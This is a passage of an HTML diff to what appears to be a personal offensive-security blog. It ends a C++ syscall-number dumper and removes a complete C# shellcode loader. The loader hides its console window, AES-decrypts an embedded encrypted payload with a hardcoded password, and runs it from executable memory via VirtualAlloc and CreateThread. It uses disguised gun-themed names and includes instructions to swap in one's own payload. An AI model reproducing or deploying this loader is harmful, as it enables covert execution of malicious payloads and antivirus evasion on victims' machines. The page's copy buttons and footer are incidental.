+                        std::cout &lt;&lt; std::left  &lt;&lt; std::setw(60) &lt;&lt; "Syscall"
+                                    &lt;&lt; " | " &lt;&lt; std::right &lt;&lt; std::setw(7) &lt;&lt; "Decimal"
+                                    &lt;&lt; " | " &lt;&lt; std::right &lt;&lt; std::setw(7) &lt;&lt; "Hex\n"
+                                    &lt;&lt; std::string(60,'-') &lt;&lt; "-+-"
+                                    &lt;&lt; std::string(7,'-')  &lt;&lt; "-+-"
+                                    &lt;&lt; std::string(7,'-')  &lt;&lt; '\n';
+                
+                        for (const auto&amp; e : exports) {
+                            std::ostringstream hex; hex &lt;&lt; "0x" &lt;&lt; std::hex &lt;&lt; std::uppercase &lt;&lt; e.ssn;
+                            std::cout &lt;&lt; std::left  &lt;&lt; std::setw(60) &lt;&lt; e.name
+                                        &lt;&lt; " | " &lt;&lt; std::right &lt;&lt; std::setw(7) &lt;&lt; std::dec &lt;&lt; e.ssn
+                                        &lt;&lt; " | " &lt;&lt; std::right &lt;&lt; std::setw(7) &lt;&lt; hex.str() &lt;&lt; '\n';
+                        }
+                    } catch (const std::exception&amp; ex) {
+                        std::cerr &lt;&lt; "Error: " &lt;&lt; ex.what() &lt;&lt; '\n';
+                        return 1;
+                    }
+                    return 0;
+                }
+                </code>
             </pre>
-          </div>
-        </details>
-        <details class="bg-gray-800 bg-opacity-50 p-4 rounded-lg group">
-          <summary class="flex items-center justify-between text-xl font-semibold text-pink-400 cursor-pointer">
-            <span>Decryption Project</span>
-            <svg class="w-6 h-6 transform transition-transform duration-200 group-open:rotate-180 text-pink-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M19 9l-7 7-7-7"/>
-            </svg>
-          </summary>
-          <div class="mt-4 relative">
-            <button class="absolute top-2 right-2 bg-indigo-500 text-white px-3 py-1 rounded text-sm" onclick="copyCode(this)">Copy</button>
-            <pre class="mt-8 overflow-x-auto bg-gray-900 p-4 rounded-lg shadow-inner">
-              <code class="language-csharp text-green-300">
-                  using System;
-                  using System.IO;
-                  using System.Runtime.InteropServices;
-                  using System.Security.Cryptography;
-                  using System.Text;
-  
-                  namespace AppDomainInvasion
-                  {
-                      class Revolver
-                      {
-                          [DllImport("kernel32.dll", SetLastError = true)]
-                          static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint Size, uint flAllocationType, uint flProtect);
-                          [DllImport("kernel32.dll")]
-                          static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-                          [DllImport("kernel32.dll")]
-                          static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-                          [DllImport("kernel32.dll")]
-                          static extern IntPtr GetConsoleWindow();
-                          [DllImport("user32.dll")]
-                          public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-                          [DllImport("kernel32.dll")]
-                          static extern void Sleep(uint dwMilliseconds);
-                          public static byte[] SmokeScreen(byte[] rifle, byte[] ammo)
-                          {
-                              byte[] bullets = null;
-                              byte[] powder = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
-                              using (MemoryStream magazine = new MemoryStream())
-                              {
-                                  using (RijndaelManaged smoke = new RijndaelManaged())
-                                  {
-                                      smoke.KeySize = 256;
-                                      smoke.BlockSize = 128;
-                                      var clip = new Rfc2898DeriveBytes(ammo, powder, 1000);
-                                      smoke.Key = clip.GetBytes(smoke.KeySize / 8);
-                                      smoke.IV = clip.GetBytes(smoke.BlockSize / 8);
-                                      smoke.Mode = CipherMode.CBC;
-                                      using (var target = new CryptoStream(magazine, smoke.CreateDecryptor(), CryptoStreamMode.Write))
-                                      {
-                                          target.Write(rifle, 0, rifle.Length);
-                                          target.Close();
-                                      }
-                                      bullets = magazine.ToArray();
-                                  }
-                              }
-                              return bullets;
-                          }
-                          public static void Fire(byte[] round)
-                          {
-                              IntPtr barrel = VirtualAlloc(IntPtr.Zero, (UInt32)round.Length, 0x3000, 0x40);
-                              Marshal.Copy(round, 0, barrel, round.Length);
-                              IntPtr trigger = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
-                              IntPtr hammer = IntPtr.Zero;
-                              hammer = CreateThread(IntPtr.Zero, 0, barrel, IntPtr.Zero, 0, IntPtr.Zero);
-                              WaitForSingleObject(hammer, 0xFFFFFFFF);
-                          }
-                          public static void Execute()
-                          {
-                              var lockup = GetConsoleWindow();
-                              ShowWindow(lockup, 0);
-                              //Change this with your encryption data
-                              byte[] Enc = new byte[288] {
-                                  0x4f, 0xb4, 0xe8, 0xf9, 0xa5, 0xde, 0x46, 0x48, 0x31, 0xd3, 0xc2, 0x22, 0xb8, 0x36, 0x7f, 
-                                  0xb8, 0xc1, 0x1f, 0x1f, 0x40, 0x86, 0x66, 0x7d, 0x7f, 0x15, 0xe0, 0x34, 0x3e, 0x31, 0x9a, 
-                                  0xb9, 0x75, 0xca, 0xae, 0xed, 0x70, 0xa3, 0x4d, 0x5c, 0x89, 0x00, 0x85, 0xc3, 0x7a, 0xe6, 
-                                  0xec, 0x1c, 0x8f, 0x35, 0x66, 0xec, 0x4f, 0xbc, 0xaa, 0xce, 0xb7, 0xbd, 0x94, 0x6e, 0x19, 
-                                  0x1f, 0xd2, 0xdf, 0x4e, 0xb3, 0x22, 0x70, 0x1d, 0x6b, 0xa3, 0x3b, 0x4a, 0x9b, 0xa0, 0x26, 
-                                  0x74, 0xe2, 0xd0, 0xed, 0x79, 0x34, 0xd2, 0x09, 0xc2, 0x48, 0x36, 0xf1, 0x0c, 0x5e, 0x64, 
-                                  0xca, 0xc3, 0xed, 0x17, 0xca, 0x8b, 0x32, 0x96, 0xc7, 0xcc, 0x7c, 0xcb, 0x4c, 0xcd, 0x15, 
-                                  0x53, 0x03, 0x09, 0xe4, 0x38, 0x40, 0x2d, 0x80, 0x66, 0xa1, 0x31, 0xda, 0x28, 0x42, 0x4a, 
-                                  0xad, 0x34, 0xba, 0x49, 0xa9, 0x46, 0x61, 0x01, 0x59, 0x7b, 0x10, 0x11, 0x0c, 0x81, 0x09, 
-                                  0x3c, 0x1c, 0x1a, 0xfe, 0xc8, 0xa9, 0x85, 0x3d, 0x6a, 0x30, 0xb5, 0x81, 0xb2, 0x3e, 0xd1, 
-                                  0x77, 0x11, 0x5e, 0xac, 0x5e, 0x3a, 0x71, 0x97, 0x19, 0x24, 0xf2, 0xf3, 0xa4, 0x86, 0x5d, 
-                                  0x1c, 0x0c, 0x5a, 0xd5, 0xae, 0x5d, 0xff, 0x53, 0x05, 0xe4, 0xa1, 0x96, 0xdd, 0x22, 0x6e, 
-                                  0xa8, 0x17, 0x25, 0xc3, 0x25, 0xb9, 0xde, 0xd3, 0xe2, 0x76, 0xa5, 0x0f, 0x85, 0x91, 0x2e, 
-                                  0xd9, 0xd9, 0xba, 0x00, 0x0f, 0x92, 0x97, 0x04, 0x25, 0x89, 0x27, 0x31, 0xbb, 0xe3, 0x81, 
-                                  0x4d, 0xaa, 0x63, 0x78, 0xc3, 0x58, 0x76, 0x9a, 0x24, 0xf6, 0xb9, 0xb4, 0x1e, 0x92, 0x7a, 
-                                  0xdb, 0xe5, 0xd5, 0xaa, 0xd0, 0xbc, 0xec, 0xbc, 0xd5, 0x82, 0xef, 0x0c, 0xec, 0x85, 0x05, 
-                                  0x7b, 0xcf, 0xf2, 0xfe, 0xc7, 0xa8, 0x9f, 0xb9, 0xe5, 0x3d, 0xc9, 0xf7, 0xff, 0x72, 0xef, 
-                                  0xc1, 0x56, 0x44, 0x40, 0xd4, 0x8d, 0x21, 0x19, 0x07, 0xe0, 0x05, 0x09, 0x6f, 0x94, 0x63, 
-                                  0xcf, 0x85, 0x86, 0x03, 0x95, 0x13, 0x2b, 0x14, 0xc6, 0x1c, 0x82, 0x31, 0x34, 0xdd, 0x33, 
-                                  0x9a, 0xd5, 0x72 };
-  
-                              byte[] gunpowder = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("MyK3yG0o0zH3r3")); //Change this
-                              Enc = SmokeScreen(Enc, gunpowder);
-                              Fire(Enc);
-  
-                          }
-                          public static void Main(string[] args)
-                          {
-                              Execute();
-                          }
-                      }
-                  }
-              </code>
             </pre>
-          </div>
-        </details>
-      </div>
+        </div>
+        </details>          
+        <style>
+        .copy-button 
+        {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            background-color: #1e293b;
+            color: #f8fafc;
+            border: none;
+            padding: 5px 10px;
+            font-size: 18px;
+            cursor: pointer;
+            border-radius: 5px;
+            z-index: 2;
+        }              
+        .copy-button:hover 
+        {
+            background-color: #3b82f6;
+        }
+        </style>
+        <script>
+        function copyCode(button) {
+            const codeBlock = button.parentElement.querySelector('code');
+            const text = codeBlock.textContent;
+
+            navigator.clipboard.writeText(text).then(() => {
+            button.textContent = 'Copied!';
+            setTimeout(() => {
+                button.textContent = 'Copy';
+            }, 1500);
+            });
+        }
+        </script>   
+        </div>
     </section>
-    <style>
-      .copy-button 
-      {
-        position: absolute;
-        top: 10px;
-        right: 15px;
-        background-color: #1e293b;
-        color: #f8fafc;
-        border: none;
-        padding: 5px 10px;
-        font-size: 18px;
-        cursor: pointer;
-        border-radius: 5px;
-        z-index: 2;
-      }              
-      .copy-button:hover 
-      {
-        background-color: #3b82f6;
-      }              
-    </style>
-    <script>
-      function copyCode(button) {
-        const codeBlock = button.parentElement.querySelector('code');
-        const text = codeBlock.textContent;
-    
-        navigator.clipboard.writeText(text).then(() => {
-          button.textContent = 'Copied!';
-          setTimeout(() => {
-            button.textContent = 'Copy';
-          }, 1500);
-        });
-      }
-    </script>     
-  </section>
-  <footer class="flex flex-col items-center sm:text-justify gap-4 py-6 bg-[#0f172a] text-gray-200">
-    <p class="text-center">2025 Iron Hulk — No rights reserved.</p>
-    <a href="../index.html" class="inline-block bg-blue-500 text-white text-sm px-4 py-2 rounded hover:bg-blue-600 transition">← Back to Dashboard</a>
-  </footer>
+    <footer class="flex flex-col items-center justify-center gap-4 py-6 bg-[#0f172a] text-gray-200">
+        <p class="text-center">Crafted with passion<br>2025 Iron Hulk — No rights reserved.</p>
+        <a href="../index.html" class="inline-block bg-blue-500 text-white text-sm px-4 py-2 rounded hover:bg-blue-600 transition">← Back to Dashboard</a>
+    </footer>
 </main>
-<script>
-  document.addEventListener('DOMContentLoaded', () => {
-    const dateWritten = '9/Jun/2025';
-    const words   = document.getElementById('article').innerText.trim().split(/\s+/).filter(Boolean).length;
-    const minutes = Math.max(1, Math.ceil(words / 230));
-    document.getElementById('reading-time').textContent = `Written: ${dateWritten} – ${minutes} min reading`;
-  });
-</script>
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const dateWritten = '20/Jan/2025';
+      const words   = document.getElementById('article').innerText.trim().split(/\s+/).filter(Boolean).length;
+      const minutes = Math.max(1, Math.ceil(words / 230));
+      document.getElementById('reading-time').textContent = `Written: ${dateWritten} – ${minutes} min reading`;
+    });
+  </script>
 </body>
 </html>
